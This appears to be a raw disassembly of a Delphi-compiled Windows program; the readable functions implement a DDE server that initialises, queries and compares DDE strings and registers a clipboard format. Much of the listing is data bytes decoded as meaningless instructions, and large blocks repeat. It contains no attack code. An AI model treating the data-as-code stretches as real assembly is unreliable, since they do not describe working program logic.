adc [ eax ] al
cmp [ eax ] al
add bh bh
pushfd
lodsb [ esi ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44070005 ] al
dec ecx
je r-xdata
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0004 ] al
jb r-xdata
add al bh
jpo r-xdata
inc eax
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
push esp
mov ah 0x46
insd
test [ ecx + eax * 2 ] cl
inc eax
add [ eax ] al
inc [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add al ch
mov bl 0x46
add al bh
aam 0x41
add al dh
aad 0x41
add [ eax ] ah
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
inc esp
mov cl 0x46
add [ ecx ] al
add bh ch
call esp
mov bl 0x46
add [ esi ] cl
push esp
inc esp
push ebx
jb r-xdata
arpl [ ebp + 0x74 ] si
dec ebp
popad
arpl [ edx + 0x6f ] si
nop
mov al [ 0x4693 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
xchg ebx eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
xchg ebx eax
inc esi
add al bl
xchg ebx eax
add [ eax + 0x4f060002 ] al
outsd
outsb
jbe r-xdata
xor [ eax ] al
add bh bh
sub [ edx + 0x10046 ] dh
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
add eax 0x656e694c
jb r-xdata
je r-xdata
add [ eax ] dl
aam 0x41
add [ ebx + edi * 2 ] dl
inc ecx
add al ch
aam 0x41
inc esi
add [ eax + eax ] cl
add [ esi + ebx * 2 ] bh
inc ecx
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
add [ ebp + esi + 0x40 ] al
add [ eax ] al
add [ eax ] al
rcl [ ebx - 0x6c27ffba ] 0x1
outsb
test [ ecx + eax * 2 ] cl
cmp [ eax ] al
add bh bh
cmp [ eax ] al
add bh bh
inc ecx
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x4babffc0 ] bl
inc esi
add [ esi + ebx * 2 ] bh
inc eax
add ah al
xchg edx eax
inc esi
add [ edi ] al
push cs
push esp
inc esp
push ebx
jb r-xdata
dec ecx
dec esp
inc ecx
jbe r-xdata
add [ ebx ] 0x0
insd
nop
in al dx
xchg ebx eax
inc esi
add [ edi ] al
push cs
push esp
inc esp
push ebx
jb r-xdata
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x4e6fffc0 ] bl
inc esi
add al bh
jpo r-xdata
outsb
inc ebp
js r-xdata
nop
mov es [ esi ]
inc eax
add [ eax ] al
inc [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
push cs
jb r-xdata
add [ eax ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c050004 ] al
imul ebp [ esi + 0x65 ] 0x414c8473
insd
mov al [ 0x38004693 ]
pop edi
inc ecx
add [ edi ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add eax 0x4692c000
add [ eax + eax ] dh
add bh bh
shl [ ecx + 0x10046 ] 0x0
test [ gs : si + 0x41 ] cl
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0006 ] al
jb r-xdata
add [ eax ] bh
xchg ebp eax
inc esi
add [ eax - 0x6b ] bl
fcom [ ebp + 0x41 ]
add [ eax ] dh
add [ eax ] al
[ eax ]
jae r-xdata
add [ 0x656e694c ] al
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
pop es
dec edi
outsb
inc ebx
insb
outsd
jae r-xdata
outsd
outsb
jbe r-xdata
outsb
push eax
outsd
imul esp [ ebp + 0x44 ] 0x61
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ edx ] cl
dec edi
jb r-xdata
clc
aam 0x41
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x6b ] cl
nop
or [ ebp + 0x46 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebp - 0x6aa7ffba ] dl
outsd
outsb
jbe r-xdata
inc esp
dec ebp
jb r-xdata
add al dh
aad 0x41
add [ eax ] ah
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
and [ ebx + 0xe0046 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
in al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
add [ edi ] al
push esp
add [ eax ] dl
aam 0x41
add [ ebx + edi * 2 ] dl
inc ecx
add al ch
aam 0x41
add [ ebx + edx * 8 - 0x2b07ffbf ] dh
inc ecx
add al 0x54
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
je r-xdata
dec edi
outsb
dec edi
jo r-xdata
xchg edx eax
inc esi
add [ eax ] bh
pop edi
inc ecx
add [ 0x64440600 ] al
dec ebp
popad
outsb
add eax [ eax ]
test [ ecx + eax * 2 ] cl
xor [ eax ] al
add bh bh
xor [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push es
dec edi
inc esi
add [ eax + eax ] cl
add [ esi + ebx * 2 ] bh
inc ecx
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x63ffffc0 ] bl
inc esi
add al bh
jpo r-xdata
rcr [ eax - 0x6b ] 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530a0002 ] al
jb r-xdata
inc esi
add [ ecx ] al
add [ eax ] al
js r-xdata
adc [ eax ] al
shl [ ecx - 0x4e03ffba ] 0x1
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040003 ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
rcl [ ebp + 0x46 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
xchg ebp eax
inc esi
add [ eax + eax ] cl
add [ eax ] al
pop eax
jb r-xdata
xchg ebp eax
inc esi
add [ eax ] bh
pop edi
inc ecx
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x6a ] bl
inc esi
add [ eax ] al
add [ eax ] al
cmp al 0x5e
inc ecx
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x44efffc0 ] bl
inc esi
add al bh
jpo r-xdata
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ ecx ] cl
inc ebp
inc esp
inc ebp
jb r-xdata
inc esp
push ebx
jb r-xdata
add [ eax ] dl
aam 0x41
add [ ebx + edi * 2 ] dl
inc ecx
add al ch
aam 0x41
add [ ebx + edx * 8 - 0x2b07ffbf ] dh
inc ecx
add al dh
aad 0x41
add [ eax ] ah
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
fdivr [ edx + 0xe0046 ]
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
in al 0x10
inc eax
add [ eax + eax ] dh
add [ eax ] al
or al 0x54
outsd
jb r-xdata
nop
mov ch 0x46
jb r-xdata
add [ edi ] al
pop es
push esp
inc esp
dec ebp
jb r-xdata
inc esi
rcr [ eax ] 0x96
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6a ] cl
inc esi
add [ esi + edx * 4 + 0x46 ] ch
inc esp
push ebx
jb r-xdata
add [ eax ] dl
aam 0x41
add [ ebx + edi * 2 ] dl
inc ecx
add al ch
aam 0x41
add al bh
jpo r-xdata
add [ eax ] al
add [ esi ] bl
xchg edi eax
inc esi
add [ eax ] cl
add [ eax ] al
cmp al 0x5e
inc ecx
add [ eax ] cl
fadd [ ecx ]
je r-xdata
hlt
jb r-xdata
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x4a6fffc0 ] bl
inc esi
insd
nop
insb
xchg esi eax
inc esi
add [ edi ] al
or al 0x54
inc esp
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x14004697 ] bh
add [ eax ] al
add [ eax ] bl
push ebx
outsd
outsb
jbe r-xdata
add [ ebx + edx * 8 - 0x2b07ffbf ] dh
inc ecx
add al dh
aad 0x41
add [ eax ] ah
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
dec esp
mov ch 0x46
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
xor [ eax ] al
add [ eax ] al
or al 0x54
jb r-xdata
add [ ecx ] al
add [ esi ] al
add [ eax ] al
jl r-xdata
add [ ebp + esi + 0x40 ] al
or al bl
inc ecx
add [ esi - 0x2ea3ffc0 ] bh
inc ecx
xor [ edi + 0xc070046 ] dl
push esp
inc esp
push ebx
jb r-xdata
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
je r-xdata
call sub_408f18
jmp r-xdata
insd
nop
inc esp
dec ebp
popad
outsb
add [ eax ] eax
in al 0x10
inc eax
add [ eax + eax ] al
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x49
je r-xdata
add [ ebx + edi * 2 ] dl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
add al 0x0
add [ eax ] al
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0xc08b6d65
rcl [ edi + 0xb070046 ] 0x1
push esp
inc esp
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0x97a06d65
inc esi
add [ ebx + edx * 2 + 0x10041 ] cl
push es
jb r-xdata
inc ecx
insd
sbb [ esi + 0x5f380046 ] dl
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
fcom [ esi + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x97
inc esi
add [ eax ] dh
xchg edi eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469909
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
inc ecx
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x520bffc0 ] bl
inc esi
add al bh
jpo r-xdata
outsd
outsb
jbe r-xdata
add [ eax ] al
add [ esp + edx * 2 ] cl
xchg esi eax
inc esi
add [ eax ] bh
pop edi
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
mov al [ 0x4697 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 4 - 0x682fffba ] ch
inc esi
add [ eax ] al
add [ eax ] al
sub_46947b
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x6e4f0800
inc ebx
push 0x65676e61
test [ ecx + eax * 2 ] cl
inc eax
add [ eax ] al
inc [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ edx ] cl
dec edi
outsb
push eax
outsd
imul esp [ ebp + 0x44 ] 0x61
je r-xdata
clc
aam 0x41
nop
or [ ebp + 0x46 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebp - 0x6aa7ffba ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x6b ] cl
inc esi
add [ eax + eax ] cl
add [ esi + ebx * 2 ] bh
inc ecx
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x63ffffc0 ] bl
inc esi
add al bh
jpo r-xdata
rcr [ eax - 0x6b ] 0x46
inc esp
dec ebp
jb r-xdata
add al dh
aad 0x41
add [ eax ] ah
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
and [ ebx + 0xe0046 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
in al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
add [ edi ] al
push esp
add [ eax ] dl
aam 0x41
add [ ebx + edi * 2 ] dl
inc ecx
add al ch
aam 0x41
add [ ebx + edx * 8 - 0x2b07ffbf ] dh
inc ecx
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
rcl [ ebp + 0x46 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
xchg ebp eax
inc esi
add [ eax + eax ] cl
add [ eax ] al
pop eax
jb r-xdata
xchg ebp eax
inc esi
add [ eax ] bh
pop edi
inc ecx
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x6a ] bl
inc esi
add [ eax ] al
add [ eax ] al
cmp al 0x5e
inc ecx
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x44efffc0 ] bl
inc esi
add al bh
jpo r-xdata
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ ecx ] cl
inc ebp
inc esp
inc ebp
jb r-xdata
inc esp
push ebx
jb r-xdata
add [ eax ] dl
aam 0x41
add [ ebx + edi * 2 ] dl
inc ecx
add al ch
aam 0x41
add [ ebx + edx * 8 - 0x2b07ffbf ] dh
inc ecx
add al dh
aad 0x41
add [ eax ] ah
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
fdivr [ edx + 0xe0046 ]
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
in al 0x10
inc eax
add [ eax + eax ] dh
add [ eax ] al
or al 0x54
outsd
jb r-xdata
nop
mov ch 0x46
jb r-xdata
add [ edi ] al
pop es
push esp
inc esp
dec ebp
jb r-xdata
inc esi
rcr [ eax ] 0x96
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6a ] cl
inc esi
add [ esi + edx * 4 + 0x46 ] ch
inc esp
push ebx
jb r-xdata
add [ eax ] dl
aam 0x41
add [ ebx + edi * 2 ] dl
inc ecx
add al ch
aam 0x41
add al bh
jpo r-xdata
add [ eax ] al
add [ esi ] bl
xchg edi eax
inc esi
add [ eax ] cl
add [ eax ] al
cmp al 0x5e
inc ecx
add [ eax ] cl
fadd [ ecx ]
je r-xdata
hlt
jb r-xdata
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x4a6fffc0 ] bl
inc esi
insd
nop
insb
xchg esi eax
inc esi
add [ edi ] al
or al 0x54
inc esp
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x14004697 ] bh
add [ eax ] al
add [ eax ] bl
push ebx
outsd
outsb
jbe r-xdata
add [ ebx + edx * 8 - 0x2b07ffbf ] dh
inc ecx
add al dh
aad 0x41
add [ eax ] ah
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
dec esp
mov ch 0x46
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
xor [ eax ] al
add [ eax ] al
or al 0x54
jb r-xdata
add [ ecx ] al
add [ esi ] al
add [ eax ] al
jl r-xdata
add [ ebp + esi + 0x40 ] al
or al bl
inc ecx
add [ esi - 0x2ea3ffc0 ] bh
inc ecx
xor [ edi + 0xc070046 ] dl
push esp
inc esp
push ebx
jb r-xdata
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
je r-xdata
call sub_408f18
jmp r-xdata
insd
nop
inc esp
dec ebp
popad
outsb
add [ eax ] eax
in al 0x10
inc eax
add [ eax + eax ] al
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x49
je r-xdata
add [ ebx + edi * 2 ] dl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
add al 0x0
add [ eax ] al
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0xc08b6d65
rcl [ edi + 0xb070046 ] 0x1
push esp
inc esp
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0x97a06d65
inc esi
add [ ebx + edx * 2 + 0x10041 ] cl
push es
jb r-xdata
inc ecx
insd
sbb [ esi + 0x5f380046 ] dl
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
fcom [ esi + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x97
inc esi
add [ eax ] dh
xchg edi eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469909
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
inc ecx
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x520bffc0 ] bl
inc esi
add al bh
jpo r-xdata
outsd
outsb
jbe r-xdata
add [ eax ] al
add [ esp + edx * 2 ] cl
xchg esi eax
inc esi
add [ eax ] bh
pop edi
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
mov al [ 0x4697 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 4 - 0x682fffba ] ch
inc esi
add [ eax ] al
add [ eax ] al
sub_469810
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor edx edx
push ebp
push sub_469902
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469909
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeGetLastError
mov ebx eax
mov eax ebx
add eax 0xffffbff9
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405dec
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408f18
jmp r-xdata
dec eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405dec
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408f18
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405dec
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408f18
sub_469910
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
xor edi edi
mov eax esi
sub eax 0x1062
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x18 ]
mov eax [ rw-data ]
call sub_469cb8
mov edi eax
and edi 0x7f
jmp r-xdata
sub eax 0x1080
je r-xdata
test ebx ebx
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x18 ]
mov eax [ rw-data ]
call sub_469d6c
mov edi eax
jmp r-xdata
sub eax 0x5f90
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov [ ebp - 0x64 ] 0x60
cmp esi 0x8080
jne r-xdata
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax [ rw-data ]
call sub_469dd0
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp esi 0x4050
jg r-xdata
lea eax [ ebp - 0x64 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push ebx
call DdeQueryConvInfo
test eax eax
je r-xdata
sub esi 0x4090
je r-xdata
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46b778
mov edi eax
jmp r-xdata
sub esi 0x3fb0
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x1c ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46b82c
mov edi eax
jmp r-xdata
sub esi 0x1030
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46b748
jmp r-xdata
sub esi 0x40
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46b614
mov edi eax
and edi 0x7f
jmp r-xdata
sub esi 0xff2
je r-xdata
mov eax [ ebp - 0x60 ]
test eax eax
je r-xdata
sub esi 0x42
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46b84c
mov edi eax
jmp r-xdata
sub esi 0x8e
je r-xdata
call sub_46a9b8
jmp r-xdata
mov ebx [ ebp - 0x60 ]
test ebx ebx
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46b84c
mov edi eax
jmp r-xdata
sub esi 0x1f60
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x1c ]
call sub_46aa04
jmp r-xdata
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_469eb4
mov eax ebx
call sub_46a9c0
jmp r-xdata
sub_469b20
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_469bd4
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_41d098
push r-xdata
call RegisterClipboardFormatA
mov [ esi + 0x48 ] ax
xor eax eax
mov [ esi + 0x44 ] eax
push 0x0
push 0x0
push sub_469910
lea eax [ esi + 0x44 ]
push eax
call DdeInitializeA
test eax eax
sete al
call sub_469810
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ esi + 0x38 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ esi + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ esi + 0x40 ] eax
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_402a94
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_469efc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469bdb
lea eax [ ebp - 0x4 ]
call sub_404038
retn
add esp 0xfffffff0
call sub_40360c
sub_469bfd
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
push ebp
call sub_403674
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x3c ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x40 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x38 ]
call sub_4032e8
xor eax eax
mov [ ebp + 0x38 ] eax
inc esi
xor edi edi
mov eax ebp
call sub_469fb0
mov eax [ ebp + 0x44 ]
push eax
call DdeUninitialize
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_41d0e4
test bl bl
jle r-xdata
call sub_4032e8
xor eax eax
mov [ ebp + 0x40 ] eax
mov eax [ ebp + 0x3c ]
call sub_4032e8
xor eax eax
mov [ ebp + 0x3c ] eax
inc esi
xor edi edi
mov eax [ ebp + 0x38 ]
mov edx edi
call sub_417570
call sub_4032e8
inc edi
dec esi
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40365c
mov eax [ ebp + 0x3c ]
mov edx edi
call sub_417570
call sub_4032e8
inc edi
dec esi
jne r-xdata
sub_469cb8
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_469d5c
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ edi + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1008 ]
lea eax [ ebp - 0x8 ]
call sub_404128
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_469fdc
test eax eax
je r-xdata
mov eax [ edi + 0x34 ]
push eax
push esi
call DdeCmpStringHandles
test eax eax
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_46a02c
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
